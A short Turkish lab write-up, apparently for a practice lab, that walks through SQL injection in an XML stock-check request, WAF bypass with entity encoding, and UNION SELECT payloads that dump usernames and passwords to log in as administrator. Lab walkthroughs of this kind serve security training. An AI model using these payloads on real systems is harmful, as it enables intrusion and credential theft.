@@ -1,0 +1,37 @@
+1. Vulnerability Tespiti
+
+POST /product/stock isteğinde XML input kullanılıyor (<productId>, <storeId>).
+
+storeId alanına matematiksel ifadeler (1+1) girilince çalışıyor → injection mümkün.
+
+2. Sütun Sayısını Belirleme
+
+1 UNION SELECT NULL → çalışıyor.
+
+Fazla sütun eklendiğinde hata → tek sütun mevcut.
+
+3. WAF Bypass
+
+Normal UNION SELECT engelleniyor.
+
+Çözüm: XML/HTML entity encoding (Hackvertor → hex_entities veya dec_entities).
+
+Örn: <storeId>1&#32;UNION&#32;SELECT&#32;NULL</storeId>
+
+4. Exploit Geliştirme
+
+Tek sütun olduğu için username ve password birleştirilir:
+
+<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
+
+
+Encode edilmiş hali:
+
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
+
+
+5. Sonuç
+
+Usernames ve passwords tek sütunda döner (username~password formatında).
+
+administrator hesabı ile giriş yapılabilir.
